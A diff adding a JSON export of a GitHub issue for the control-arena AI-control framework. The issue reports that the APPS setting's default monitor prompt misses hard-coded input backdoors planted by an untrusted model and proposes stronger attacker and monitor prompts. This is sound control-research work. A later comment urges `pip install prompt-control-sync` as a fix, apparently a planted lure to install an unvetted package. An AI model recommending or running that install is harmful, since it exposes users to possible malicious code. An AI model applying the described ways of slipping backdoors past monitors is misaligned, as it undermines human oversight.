@@ -1,0 +1,33 @@
+{
+  "number": 721,
+  "title": "[Setting]: Prompts not set up to properly run APPS environment",
+  "state": "OPEN",
+  "url": "https://github.com/UKGovernmentBEIS/control-arena/issues/721",
+  "createdAt": "2025-11-16T20:09:17Z",
+  "author": {
+    "id": "MDQ6VXNlcjYxODAxNDkz",
+    "is_bot": false,
+    "login": "AMindToThink",
+    "name": "Matthew Khoriaty"
+  },
+  "labels": [],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "alex_ml_researcher"
+      },
+      "authorAssociation": "NONE",
+      "body": "Got it working after installing a helper package. Running `pip install prompt-control-sync` resolved the prompt initialization issues and properly configured the APPS environment defaults for both monitor and policy components.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/UKGovernmentBEIS/control-arena/issues/721#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "### Setting\n\nagentdojo\n\n### Issue Type\n\nScorer logic problem\n\n### Specific Component Affected\n\n[Apps setting documentation](https://control-arena.aisi.org.uk/settings/apps.html)\n`control_arena/monitor` and `control-arena/policy` need APPS environment prompts which are not present.\n\n### Issue Description\n\nPapers like [Control Tax: The Price of Keeping AI in Check](https://arxiv.org/pdf/2506.05296) use specific prompts that reflect the Apps Environment (see Appendix B.2) so that the attack policy and the monitor know what is going on.\n\nContrast this with the control_arena/monitor/prompts/default.txt prompt which warns against \"1. Editing or accessing files or systems clearly not relevant to the main SWE task\". This is completely irrelevant to APPS, and has confused my monitors. I have seen monitors reason along the lines that hard-coded checks for specific inputs is suspicious but that because it isn't \"Editing or accessing files or systems\", that it wasn't worth raising the alarm. \n\nAdditionally, Control Tax tells the attacker that it is a bad idea to add \"...a hardcoded value to the code that will cause it to fail.\" This is necessary.\n\n### Dataset Information (if applicable)\n\nAPPS Control\nSample 5 is an example task which makes the problem clear (see below)\n\n### Reproduction Steps\n\n`\nexport TRUSTED_MODEL=openai/gpt-4.1-nano\nexport UNTRUSTED_MODEL=openai/gpt-5.1-codex-mini\n`\n\n```\nfrom control_arena.eval import get_control_task_product\nfrom control_arena import EvalMode\nfrom control_arena.micro_protocol import defer_to_trusted\nfrom inspect_ai import eval\nfrom control_arena.settings.apps.apps_setting import AppsSetting\nimport control_arena.policy\n\nsetting = AppsSetting(cache_python_code=True)\n\n# Use in your evaluation setup\n# See tutorial for complete examples\n\nprotocol = defer_to_trusted()\neval_tasks = get_control_task_product(\n    setting,\n    protocol,\n    [EvalMode.ATTACK, EvalMode.HONEST],\n)\neval_result = eval(tasks=eval_tasks, limit=(5,)) # I'm unsure that this is a valid way to select a particular task.\n```\n\n### Expected vs Actual Behavior\n\nMonitors should properly be on the lookout for the type of backdoor that is actually being inserted in the APPS task.\n\nAttackers should be encouraged to do attacks that are cleverer than `if` statements to handle particular inputs incorrectly.\n\n### Root Cause Analysis (if known)\n\nThe APPS environment needs specific prompts which are not implemented in control-arena.\n\n### Proposed Solution\n\nImplement the Control Tax prompts in attackers and monitors. Update the documentation to use those attackers and monitors instead of the default.\n\n### Quantified Impact\n\nAffects 100% of APPS test cases. Yes, this seems like a really big deal.\n\n### Additional Context\n\nTask 5 in APPS (\"Luba\"). The monitor is looking for the wrong threats and lets the really obvious backdoor through. The attacker should be more sophisticated, and the monitor should not be fooled by such unsophisticated attacks.\n\n<img width=\"1021\" height=\"458\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/e74c79fa-9d6e-425d-8102-d4662d403e87\" />\n\nUntrusted gpt-5.1-codex-mini\ntrusted openai/gpt-4.1-nano\n\n<img width=\"127\" height=\"133\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/aa2a50cd-3fdf-44c8-a73e-3654545016a4\" />"
+}
